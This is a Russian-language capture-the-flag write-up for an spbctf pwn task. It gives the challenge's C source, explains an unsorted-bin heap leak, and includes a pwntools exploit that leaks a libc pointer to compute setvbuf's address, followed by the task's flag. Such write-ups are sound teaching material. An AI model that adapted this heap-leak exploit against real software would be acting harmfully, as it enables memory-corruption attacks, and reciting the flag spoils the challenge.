[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn9_mc7)
Libc is Waldo now. Where is it in the memory?
`nc 109.233.56.90 11737`
**[mc7.elf](https://pwn.spbctf.ru/files/bins/mc7/mc7.elf)**  
**[libc.so.6](https://pwn.spbctf.ru/files/bins/mc7/libc.so.6)**  
**[ld-linux-x86-64.so.2](https://pwn.spbctf.ru/files/bins/mc7/ld-linux-x86-64.so.2)**  
**[mc7.c](https://pwn.spbctf.ru/files/bins/mc7/mc7.c)**

Исходный код:
``` C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define countof(x) (sizeof(x) / sizeof((x)[0]))

char * CHUNKS[32];
int CHUNK_SIZES[32];
int CHUNK_TAKEN[32];

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0); 

    printf("Where Is Libc?\n");
    
    int i;
    
    while (1) {
        printf("\n");
        for (i = 0; i < countof(CHUNKS); i++) {
            if (CHUNKS[i] != NULL) {
                printf("%s chunk %d) size %d, ptr %p -> '%s'\n", CHUNK_TAKEN[i] ? "Allk" : "FREE", i, CHUNK_SIZES[i], CHUNKS[i], CHUNKS[i]);
            }
        }
        
        printf("(a)lloc X   (f)ree I   (G)et flag > ");
        char choice[4];
        int num;
        alarm(120);
        if (scanf("%1s", choice) != 1) {
            return 0;
        }
        
        if (choice[0] == 'a') {
            scanf("%d", &num);
            for (i = 0; i < countof(CHUNKS); i++) {
                if (CHUNKS[i] == NULL) {
                    break;
                }
            }
            if (i >= countof(CHUNKS)) {
                printf("Everything is taken\n");
            } else {
                CHUNK_SIZES[i] = num;
                CHUNKS[i] = malloc(num);
                CHUNK_TAKEN[i] = 1;
            }
        } else if (choice[0] == 'f') {
            scanf("%d", &num);
            if (CHUNKS[num] == NULL || CHUNK_SIZES[num] < 0) {
                printf("Already free\n");
            } else {
                free(CHUNKS[num]);
                CHUNK_TAKEN[num] = 0;
            }
        } else if (choice[0] == 'G') {
            printf("At what pointer is setvbuf() function inside libc? Three last hex digits should be ...%03x\n> ", (unsigned int)((unsigned long long)setvbuf & 0xFFF));
            unsigned long long answer = 0;
            scanf("%llx", &answer);
            printf("You have answered: %p\n", (void *)answer);
            
            if (answer == (unsigned long long)setvbuf) {
                printf("That's correct!\nHere is your flag: ");
                system("cat flag.txt");
                return 0;
            } else {
                printf("No, that's wrong\n");
            }
        }
    }
}
```

Необходимо провести атаку на `unsorted bin`, после освобождения чанка большого размера в его содержимом будет заполнено поле `fd`, если его ликнуть, то можно высчитать базу `libc`.

Эксплоит:
``` python
def alloc(io, size):
    io.sendlineafter(b' > ', (f'a {size}').encode())

def free(io, index):
    io.sendlineafter(b' > ', (f'f {index}').encode())

setvbuf_offset = 0x81360

io = start()

alloc(io, 2000)
alloc(io, 10)

free(io, 0)
io.recvuntil(b'FREE')

io.recvuntil(b"'")
leak_addr = u64(io.recvuntil(b"'")[:-1].ljust(8, b'\x00'))
#offset = leak_addr - io.libc.address # 0x3ebca0
libc_base = leak_addr - 0x3ebca0
setvbuf = libc_base + setvbuf_offset

io.sendlineafter(b' > ', b'G')
io.sendlineafter(b'> ', hex(setvbuf).encode())

io.interactive()
```
Порядок аллокаци необходимо соблюдать. Если сделать наоборот: сначала `alloc(io, 10)`, потом `alloc(io, 2000)`, то после `free(io, 1)` чанк размера `2000` просто прикрепится к `top chunk` и никакой служебной информации содержать не будет.

Запуск:
![](../../../../z.%20Images/{809AC815-BD6B-426C-9A77-9573A7BC40A9}.png)

Ответ: `spbctf{39e119c6e42ebdd2d9a24c7bdbc98622}`